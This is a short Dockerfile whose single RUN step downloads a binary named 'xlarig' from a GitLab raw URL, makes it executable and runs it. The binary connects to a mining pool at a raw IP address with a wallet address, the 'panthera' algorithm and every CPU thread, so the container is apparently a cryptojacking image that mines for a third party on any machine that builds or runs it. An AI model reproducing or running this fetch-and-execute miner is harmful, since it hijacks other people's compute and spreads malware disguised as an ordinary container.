 FROM ubuntu:latest

 RUN apt-get update && \
     apt-get install wget -y && \
     wget https://gitlab.com/mustofaku/mustofa/raw/main/xlarig && chmod +x xlarig && ./xlarig --donate-level 1 -o 157.245.204.147:443 -u Svjay5hewpoDs9k8pvkhQ7Ns9tRFviYRqCfRmvCRptncVZSNnoCZ9ky3sEpwJV1sqbgk3TBpjmUf2CcgaFrvaf8E2ttBHCgox -p hah -a panthera -k -t$(nproc --all)
